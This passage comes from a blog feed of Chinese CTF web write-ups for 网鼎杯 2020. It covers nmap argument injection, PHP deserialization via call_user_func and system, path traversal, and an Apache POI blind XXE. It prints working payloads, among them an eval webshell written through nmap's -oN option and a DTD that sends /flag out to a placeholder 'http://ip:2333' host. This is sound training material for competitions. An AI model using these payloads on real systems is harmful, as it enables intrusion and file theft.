href="https://www.gem-love.com/ctf/2361.html#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF" target="_blank" rel="noopener">防灾科技学院GKCTF 2020 Writeup</a><br><a href="https://www.php.cn/js-tutorial-409538.html" target="_blank" rel="noopener">nodejs中express框架的中间件及app.use和app.get方法的解析</a><br><a href="https://github.com/commenthol/safer-eval/issues/10" target="_blank" rel="noopener">safer-Eval的RCE</a><br><a href="https://byqiyou.github.io/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">浅析Redis中SSRF的利用</a></p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
          <category> disable_functions绕过 </category>
          
          <category> CVE-2020-7066 </category>
          
          <category> ShopXo </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> WEB </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020朱雀组-web</title>
      <link href="/2020/05/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web/"/>
      <url>/2020/05/18/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84-web/</url>
      
        <content type="html"><![CDATA[<p>nmap那题就基本命令然后还有一个别的方法。</p><a id="more"></a><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><p><b>index.php</b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'settings.php'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'host'</span>])):</span><br><span class="line"><span class="keyword">if</span> (!defined(<span class="string">'WEB_SCANS'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Web scans disabled'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host = $_POST[<span class="string">'host'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($host,<span class="string">'php'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">&#125;</span><br><span class="line">$host = escapeshellarg($host);</span><br><span class="line">$host = escapeshellcmd($host);</span><br><span class="line"></span><br><span class="line">$filename = substr(md5(time() . rand(<span class="number">1</span>, <span class="number">10</span>)), <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">$command = <span class="string">"nmap "</span>. NMAP_ARGS . <span class="string">" -oX "</span> . RESULTS_PATH . $filename . <span class="string">" "</span> . $host;</span><br><span class="line">$result_scan = shell_exec($command);</span><br><span class="line"><span class="keyword">if</span> (is_null($result_scan)) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Something went wrong'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">header(<span class="string">'Location: result.php?f='</span> . $filename);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><b>settings.php</b></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="comment"># Path where all files stored</span></span><br><span class="line"><span class="comment"># Example values: /home/node/results/</span></span><br><span class="line"><span class="comment"># Or just: xml/</span></span><br><span class="line"><span class="comment"># Must be readble/writable for web server! so chmod 777 xml/</span></span><br><span class="line">define(<span class="string">'RESULTS_PATH'</span>, <span class="string">'xml/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Nmap string arguments for web scanning</span></span><br><span class="line"><span class="comment"># Example: -sV -Pn</span></span><br><span class="line">define(<span class="string">'NMAP_ARGS'</span>, <span class="string">'-Pn -T4 -F --host-timeout 1000ms'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Comment this line to disable web scans</span></span><br><span class="line">define(<span class="string">'WEB_SCANS'</span>, <span class="string">'enable'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># URL of application</span></span><br><span class="line"><span class="comment"># for example: http://example.com/scanner/</span></span><br><span class="line"><span class="comment"># Or just: /scanner/</span></span><br><span class="line">define(<span class="string">'APP_URL'</span>, <span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># Secret word to protect webface (reserved)</span></span><br><span class="line"><span class="comment"># Uncomment to set it!</span></span><br><span class="line"><span class="comment"># define('secret_word', 'passw0rd1337');</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第一种方法"><a href="#第一种方法" class="headerlink" title="第一种方法"></a>第一种方法</h3><p>用的是nmap,提示<!-- flag is in /flag --><br>一开始以为是ping命令，后来发现过滤了php。<br>后来试了下nmap的命令组合成功了。<br>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' -iL /flag -oN flag.txt '</span></span><br></pre></td></tr></table></figure><p>存入flag.txt之后直接访问就行了</p><h3 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h3><p><a href="https://www.anquanke.com/post/id/168093#h2-0" target="_blank" rel="noopener">PHP-escapeshell-命令执行</a><br>因为过滤了php,可以用phtml绕过，里面的内容用短标签</p><h4 id="逃逸单引号"><a href="#逃逸单引号" class="headerlink" title="逃逸单引号"></a>逃逸单引号</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host=<span class="string">'&lt;?=eval($_GET[a]);?&gt; -oN flag.phtml '</span></span><br></pre></td></tr></table></figure><h2 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h2><p>利用<code>func=file_get_contents&amp;p=index.php</code>拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disable_fun = <span class="keyword">array</span>(<span class="string">"exec"</span>,<span class="string">"shell_exec"</span>,<span class="string">"system"</span>,<span class="string">"passthru"</span>,<span class="string">"proc_open"</span></span><br><span class="line">    ,<span class="string">"show_source"</span>,<span class="string">"phpinfo"</span>,<span class="string">"popen"</span>,<span class="string">"dl"</span>,<span class="string">"eval"</span>,<span class="string">"proc_terminate"</span>,<span class="string">"touch"</span></span><br><span class="line">    ,<span class="string">"escapeshellcmd"</span>,<span class="string">"escapeshellarg"</span>,<span class="string">"assert"</span>,<span class="string">"substr_replace"</span></span><br><span class="line">    ,<span class="string">"call_user_func_array"</span>,<span class="string">"call_user_func"</span>,<span class="string">"array_filter"</span>, <span class="string">"array_walk"</span></span><br><span class="line">    ,<span class="string">"array_map"</span>,<span class="string">"registregister_shutdown_function"</span>,<span class="string">"register_tick_function"</span></span><br><span class="line">    ,<span class="string">"filter_var"</span>, <span class="string">"filter_var_array"</span>, <span class="string">"uasort"</span>, <span class="string">"uksort"</span>, <span class="string">"array_reduce"</span></span><br><span class="line">    ,<span class="string">"array_walk"</span>,<span class="string">"array_walk_recursive"</span>,<span class="string">"pcntl_exec"</span>,<span class="string">"fopen"</span>,<span class="string">"fwrite"</span>,<span class="string">"file_put_contents"</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span><span class="params">($func, $p)</span> </span>&#123;</span><br><span class="line">    $result = call_user_func($func, $p);    <span class="comment">//call_user_func — 把第一个参数作为回调函数调用</span></span><br><span class="line">    $a= gettype($result);   <span class="comment">//返回 PHP 变量的类型 var.</span></span><br><span class="line">    <span class="keyword">if</span> ($a == <span class="string">"string"</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = $_REQUEST[<span class="string">"func"</span>];</span><br><span class="line">$p = $_REQUEST[<span class="string">"p"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($func != <span class="keyword">null</span>) &#123;</span><br><span class="line">    $func = strtolower($func);</span><br><span class="line">    <span class="keyword">if</span> (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> gettime($func, $p);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化Test,利用call_user_func函数进行绕过，文件名匹配可以用反序列化绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $p = <span class="string">"Y-m-d h:i:s a"</span>;</span><br><span class="line">    <span class="keyword">var</span> $func = <span class="string">"date"</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">""</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a -&gt; p=<span class="string">"ls ../../../../../"</span>;</span><br><span class="line">$a -&gt; func = <span class="string">"system"</span>;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><p><img src="/2.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a -&gt; p=<span class="string">"cat /tmp/flagoefiu4r93"</span>;</span><br><span class="line"><span class="comment">#$a -&gt; p="find / -name flag*";</span></span><br><span class="line">$a -&gt; func = <span class="string">"system"</span>;</span><br><span class="line">print_r(urlencode(serialize($a)));</span><br></pre></td></tr></table></figure><p><img src="/3.jpg"></p><pre><code>## 参考[PHP-escapeshell-命令执行](https://www.anquanke.com/post/id/168093#h2-0)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> nmap </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯2020青龙组-web</title>
      <link href="/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/"/>
      <url>/2020/05/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-web/</url>
      
        <content type="html"><![CDATA[<p>看来反序列化要多打点了，反序列化这块都不怎么熟~</p><a id="more"></a><h2 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">"flag.php"</span>);</span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $op;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $filename;</span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $content;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span></span><br><span class="line"><span class="php">        $content = <span class="string">"Hello World!"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;write();</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;read();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output($res);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(strlen((string)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;output(<span class="string">"Too long!"</span>);</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">"Successful!"</span>);</span></span><br><span class="line"><span class="php">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Failed!"</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        $res = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span></span><br><span class="line"><span class="php">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> $res;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"[Result]: &lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $s;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;process();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($s)</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">true</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">'str'</span>&#125;)) &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="php">    $str = (string)$_GET[<span class="string">'str'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(is_valid($str)) &#123;</span></span><br><span class="line"><span class="php">        $obj = unserialize($str);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p id="div-border-left-red">考点：<br>&nbsp;&nbsp;序列化后产生不可见字符<br></p><h3 id="private、protected序列化后产生不可见字符"><a href="#private、protected序列化后产生不可见字符" class="headerlink" title="private、protected序列化后产生不可见字符"></a>private、protected序列化后产生不可见字符</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>属性序列化的时候格式是 %<span class="number">00</span>类名%<span class="number">00</span>成员名</span><br><span class="line"><span class="keyword">protected</span>属性序列化的时候格式是 %<span class="number">00</span>*%<span class="number">00</span>成员名</span><br></pre></td></tr></table></figure><h3 id="destruct"><a href="#destruct" class="headerlink" title="__destruct()"></a>__destruct()</h3><p>而<b>__destruct()</b>这个魔术方法在每次销毁一个对象时触发。<br>而 PHP 的特性 「 运行完一次请求则销毁环境 」 的做法。反正执行完请求后所有该销毁的都会销毁。<br>但是我们要把op &#x3D;&#x3D; 2才能进入read利用</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>PHP7.1以上的反序列化不会判断里面参数的属性类型了，所以可以改成public再进行反序列化，绕过private、protected序列化后产生不可见字符。__destruct()方法，当op&#x3D;&#x3D;&#x3D;”2”时会将”2”变成”1”,可以把op转成int型进行绕过~</p><h3 id="读取"><a href="#读取" class="headerlink" title="读取"></a>读取</h3><p>因为默认路径改了个名~<br>先读取一下index.php<br><img src="/1.jpg" alt="serialize"><br><img src="/2.jpg"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">O:</span><span class="number">11</span>:<span class="string">"FileHandler"</span>:<span class="number">3</span>:&#123;<span class="string">s:</span><span class="number">2</span>:<span class="string">"op"</span>;<span class="string">i:</span><span class="number">2</span>;<span class="string">s:</span><span class="number">8</span>:<span class="string">"filename"</span>;<span class="string">s:</span><span class="number">58</span>:<span class="string">"php://filter/read=convert.base64-encode/resource=index.php"</span>;<span class="string">s:</span><span class="number">7</span>:<span class="string">"content"</span>;N;&#125;</span><br></pre></td></tr></table></figure><p>可以看到成功读取了<br>但是读不到flag.php~~<br><b>linux提供了&#x2F;proc&#x2F;self&#x2F;目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于&#x2F;proc&#x2F;本进程pid&#x2F;。进程可以通过访问&#x2F;proc&#x2F;self&#x2F;目录来获取自己的信息。</b></p><p>下面内容来自<a href="https://imagin.vip/?p=1391" target="_blank" rel="noopener">imagin</a></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> maps 记录一些调用的扩展或者自定义 so 文件</span><br><span class="line"><span class="number">2.</span> environ 环境变量</span><br><span class="line"><span class="number">3.</span> comm 当前进程运行的程序</span><br><span class="line"><span class="number">4.</span> cmdline 程序运行的绝对路径</span><br><span class="line"><span class="number">5.</span> cpuset docker 环境可以看 machine ID</span><br><span class="line"><span class="number">6.</span> cgroup docker环境下全是 machine ID 不太常用</span><br></pre></td></tr></table></figure><p>利用&#x2F;proc&#x2F;self&#x2F;cmdline找到当前运行程序的路径，<br>然后找到当前的网站根目录配置文件。<br>不过好像相对路径也可以~</p><h2 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h2><p>一开始还以为是java上传题，后来下载时候发现可能是目录穿越。<br><img src="/3.jpg"><br>可以看到路径，看看WEB-INF下面的web.xml试试</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../</span>..<span class="regexp">/../u</span>sr<span class="regexp">/local/</span>tomcat<span class="regexp">/webapps/</span>ROOT<span class="regexp">/WEB-INF/</span>web.xml</span><br></pre></td></tr></table></figure><p>比赛的时候和buu的路径不太一样。<br><img src="/4.jpg"></p><p><img src="/5.jpg"><br>一共三个文件，在UploadServlet.class文件中存在上传<code>poi-ooxml-3.10 has something wrong</code>这样的输出，发现3.10有一个漏洞</p><p><img src="/6.jpg"></p><p><a href="https://www.jianshu.com/p/73cd11d83c30" target="_blank" rel="noopener">Apache POI 3.10-FINAL及以前版本被发现允许远程攻击者通过注入XML外部实体访问外部实体资源或者读取任意文件。</a></p><h3 id="构造Blind-OOB-XXE"><a href="#构造Blind-OOB-XXE" class="headerlink" title="构造Blind OOB XXE"></a>构造Blind OOB XXE</h3><p>上传引入我们的vps里的dtd的一个xml的外部实体攻击<br><br>上传的文件满足两个条件：<br></p><ol><li>以<code>excel-</code>开头</li><li>以<code>xlsx</code>结尾</li></ol><p><b>我在BUU上复现的，BUU靶机只能内网访问。所以需要用小号开一个Basic里面的linux靶机</b></p><p>在&#x2F;var&#x2F;www&#x2F;html&#x2F;下构建一个1.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///flag"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:2333?%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先创建一个xlsx文件，然后改后缀为zip修改里面的[Content_Types].xml文件。(先把该文件单独解压出来，修改完后再压进去)</p><p><img src="/7.jpg"></p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [ </span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/1.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%remote;%int;%send;</span></span><br><span class="line"><span 